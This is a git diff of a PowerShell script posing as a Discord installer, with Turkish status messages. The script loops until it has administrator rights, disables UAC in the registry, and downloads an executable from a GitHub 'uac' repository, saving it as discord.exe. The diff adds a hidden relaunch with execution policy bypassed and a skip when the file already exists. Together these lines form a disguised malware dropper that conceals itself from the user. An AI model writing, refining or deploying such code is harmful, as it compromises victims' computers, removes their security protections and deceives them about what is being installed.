@@ -1,4 +1,5 @@
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$isHidden = $env:HIDDEN -eq '1'
 
 if (-not $isAdmin) {
     while ($true) {
@@ -13,6 +14,12 @@ if (-not $isAdmin) {
     }
 }
 
+if (-not $isHidden) {
+    $env:HIDDEN = "1"
+    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -WindowStyle Hidden
+    exit
+}
+
 Write-Host "Discord kurulumu basliyor..."
 Write-Host "UAC devre disi birakiliyor..."
 
@@ -23,6 +30,11 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v E
 $DownloadURL = 'https://raw.githubusercontent.com/stenehzin/uac/main/setup.exe'
 $TempPath = $env:TEMP
 $FilePath = Join-Path $TempPath 'discord.exe'
+
+if (Test-Path $FilePath) {
+    Write-Host "Discord zaten mevcut! Kurulum atlaniyor."
+    exit
+}
 
 Write-Host "Indiriliyor: $DownloadURL"
 
